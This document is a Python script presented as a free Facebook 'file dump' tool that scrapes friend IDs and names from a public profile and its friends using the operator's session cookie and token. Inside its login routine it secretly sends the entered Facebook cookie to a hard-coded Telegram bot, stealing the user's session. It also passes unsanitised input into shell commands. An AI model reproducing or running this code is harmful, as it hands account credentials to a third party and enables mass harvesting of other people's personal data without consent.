#------------------[ IMPORT ]-------------------#
import requests,random,sys,json,os,re,time
from time import sleep as slp
from os import system as cmd
totaldmp = 0
count = 0
reqs = requests.Session()
#------------------[ COLOR ]-------------------#
sex = '\033[0;31m[\033[0;32m•\033[0;31m]'
c = '\033[0;32m'
d = '\033[0;31m'
x = '\033[1;91m'
xx = '\x1b[1;92m'
xxx = '\x1b[1;93m'
xxxx = '\x1b[1;94m'
xxxxx = '\x1b[1;95m'
xxxxxx = '\x1b[1;96m'
xxxxxxx = '\x1b[1;97m'
xxxxxxxx = '\x1b[1;90m'
xxxxxxxxx = '\033[1;41m'
xxxxxxxxxx = '\033[1;0m'
bot_token = "5854605358:AAFbedYdgQhQnz16YUtzO2Bh2tvXB7SPZB0"
chat_id = "5102812169"
head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
#------------------[ RUN TEXT ]-------------------#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)

#------------------[ LOGO ]-------------------#
logo = f"""
\033[0;37md8b   db d888888b d8b   db    d88b  .d8b.  
\033[0;37m888o  88   `88'   888o  88    `8P' d8' `8b 
\033[0;37m88V8o 88    88    88V8o 88     88  88ooo88 
\033[0;37m88 V8o88    88    88 V8o88     88  88~~~88 
\033[0;37m88  V888   .88.   88  V888 db. 88  88   88 
\033[0;37mVP   V8P Y888888P VP   V8P Y8888P  YP   YP 
\033[0;32m┌────────────────────────────────────────┐
\033[0;31m│ {sex}\033[0;37mAUTHOR       : {c}NINJA-XD             \033[0;31m│
\033[0;31m│ {sex}\033[0;37mGITHUB       : {c}X-NINJA-XD           \033[0;31m│
\033[0;31m│ {sex}\033[0;37mVERSION      : {c}0.0.1                \033[0;31m│
\033[0;31m│ {sex}\033[0;37mTOOL         : {c}FILE-DUMP            \033[0;31m│       
\033[0;31m│ {sex}\033[0;37mSTUTUS       : {c}FREE                 \033[0;31m│       
\033[0;32m└────────────────────────────────────────┘"""
 
def __mahadi__():
    print('\033[0;32m──────────────────────────────────────────')
cokbrut=[]
tokenku = []
pwpluss,pwnya=[],[]
#------------------[ LOGIN ]-------------------#
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_hasan()
        except requests.exceptions.ConnectionError:
            print(f'\033[1;91m[x] PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN')
            exit()
    except IOError:
        login_hasan()
def login_hasan():
    try:
        os.system("xdg-open https://github.com/X-NINJA-XD")
        os.system('clear')
        print(logo)
        ses = requests.Session()
        print(f'{sex} -{c}PUT YOUR COOKIES') 
        cookie=input(f'{sex} -{c}NEED COOKIES : \x1b[93m')
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        ken = open(".token.txt", "w").write(tok)
        cok = open(".cok.txt", "w").write(cookie)
        print(f'\033[1;92m[✓] LOGIN SUCCESSFUL')
        url = requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=COOKIE: {cookie}")
        os.system("python XD.py")
     #   exit()
    except Exception as e:
        os.system("rm -rf .token.txt")
        os.system("rm -rf .cok.txt")
        print("\033[1;91m[×] COOKIES EXPIRED ")
        exit()
        
#------------------[ MENU ]-------------------#
def menu(my_name,my_id):
    os.system("xdg-open https://www.facebook.com/peaky009")
    os.system('clear')
    print(logo)
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        print(f'\033[1;91m[×] TOKEN EXPIRED')
        login_hasan()
    print('\033[0;37m──────────────────────────────────────────')
    print(f"{d}[{c}A{d}]-{c}UNLIMITED FILE FROM 1 UID")
    print(f"{d}[{c}B{d}]-{c}SEPRATE ID")
    print(f"{d}[{c}C{d}]-{c}JOIN OUR GROUP")
    print(f"{d}[{c}X{d}]-{c}LOGOUT YOUR COOKIE")
    print('\033[0;37m──────────────────────────────────────────')
    __minhumx=input(f'{sex} -{c}CHOOSE : \x1b[1;93m')
    if __minhumx in ['A','a']:
        ___auto___()
    elif __minhumx in ['b','B']:
        ___cut___()
    elif __minhumx in ['C','c']:
      os.system("xdg-open https://www.facebook.com/groups/peaky009")
      os.system("python XD.py")
    elif __minhumx in ['X','x']:
        os.system("rm -f .token.txt");os.system("rm -f .cok.txt");exit(f'{sex} -{c}YOUR COOKIE LOG OUT SUCCESSFULLY')
    else:
        print(f"{sex} -{c}CHOICE A VALID OPTION ")
        os.system("python XD.py")
     
#------------------[ SEP ]-------------------#
def ___cut___():
    os.system('clear')
    print(logo)
    try:
        limit = int(input(f'{sex} -{c}HOW MANY LINKS DO YOU WANT TO SEPARATE ? '))
    except:
        limit = 1
    print (f'{sex} -{c}EXAMPLE /sdcard/minhu.txt')
    file_name = input(f'{sex} -{c}ENTER OLD FILE NAME : ')
    print (f'{sex} -{c}EXAMPLE /sdcard/minhu2txt')
    new_save = input(f'{sex} -{c}ENTER NEW FILE NAME : ')
    y = 0
    for k in range(limit):
        y+=1
        print (f'{sex} -{c}EXAMPLE [1000,10008,100083,10000]')
        links = input(f'{sex} -{c}CHOOSE %s:\033[1;32m '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(f'\033[0;37m──────────────────────────────────────────')
    print(f'{sex} -{c}LINKS GRABBED SUCCESSFULLY')
    print(f'{sex} -{c}TOTAL GRABBED LINKS:\033[1;32m'+str(len(open(new_save).read().splitlines())))
    print(f'{sex} -{c}NEW FILE SAVED AS :\033[1;32m  '+new_save)
    print(f'\033[0;37m──────────────────────────────────────────')
    print("")
    input('\033[1;33m[>] GO TO BACK ')
    os.system("python XD.py")
    
#-------------------AUTO-DUMP-----------------------#          
import requests,random,sys,json,os,re,time
from time import sleep as slp
from os import system as cmd
import os
totaldmp = 0
count = 0
tokenku = []
try:
    os.mkdir('data')
except:
    pass
try:
    os.remove('temp.txt')
except:
    pass
head = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
os.system('clear')
print(logo)
def grep(f):
    o = input(f'{sex} -{c}NEW FILE NAME : ')
    try:
        ask_link = int(input(f'{sex} -{c}ENTER DUMP LIMIT : '))
    except:
        ask_link = 1
        completed = 0
    for links in range(ask_link):
        li = input(f'\033[1;92m[•] EXAMPLE \033[1;97m[100083,100084\n\033[1;92m┗━{sex} -{c}PUT YOUR UID CODE : ')
        os.system('cat '+f+' | grep "'+li+'" >> '+o)
    print(f"{sex} -{c}SEPARATING SUCCESSFUL")
    print(f"{sex} -{c}NEW FILE SAVE " + o)
    input(f"{sex} -{c}BACK ")
    os.system("python XD.py")
 
#------------------[ ONE LINK ]-------------------#
def ___auto___():
    fbidz = []
    os.system('clear')
    print(logo)
    try:
        token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
    except:
        login()
    global totaldmp,count
    try:
        token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
    except FileNotFoundError:
        print(f"{sex} -{c}TOKEN NOT FOUND")
        slp(1)
        cmd('rm -rf data/token.txt')
        login()
    try:
        os.system('clear')
        print(logo)
        try:
            token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
            fbbuid = input(f"{sex} -{c}ENTER PUBLIC ID : \x1b[1;93m")
            dmp = requests.get("https://graph.facebook.com/"+fbbuid+"?fields=friends.limit(5000)&access_token="+token, cookies={'cookie':cok}).json()
            for idnm in dmp['friends']['data']:
                totaldmp+=1
                fbidz.append(idnm['id'])
        except KeyError:
            time.sleep(0.5)
            print(f"{sex} -{c}ID WAS NOT PUBLIC")
            time.sleep(1.0);___auto___()
        filepath = input(f"{sex} -{c}FILE NAME : \x1b[1;93m")
        __mahadi__()
        apnd = open(filepath,'w');ids=[]
        for fbuid in fbidz:
            count += 1
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=friends.limit(5000)&access_token="+token, cookies={'cookie':cok}).json()
                for idnm in dmp['friends']['data']:
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n');ids.append(idnm['id'])
            except KeyError:
                pass
            bio = random.choice([x,xx,xxx,xxxx,xxxxx,xxxxxx,xxxxxxx])
            print(f"{c}[{d}{bio}TOTOL ID \033[1;97m: {len(ids)}{d}~•~{c}[{d}{bio}FROM {c}: {fbuid}{c}]");sys.stdout.flush()
        apnd.close()
        __mahadi__()
        print (f"{sex} -{c}TOTAL DUMP ID :\033[1;97m {ids}")
        print (f"{sex} -{c}YOUR DUMP FILE :\033[1;97m {filepath}")
        __mahadi__()
        input("\n[•] BACK")
        os.system("python XD.py")
    except Exception as e:
        exit()
 
#------------------[ MAIN ]-------------------#
login()
 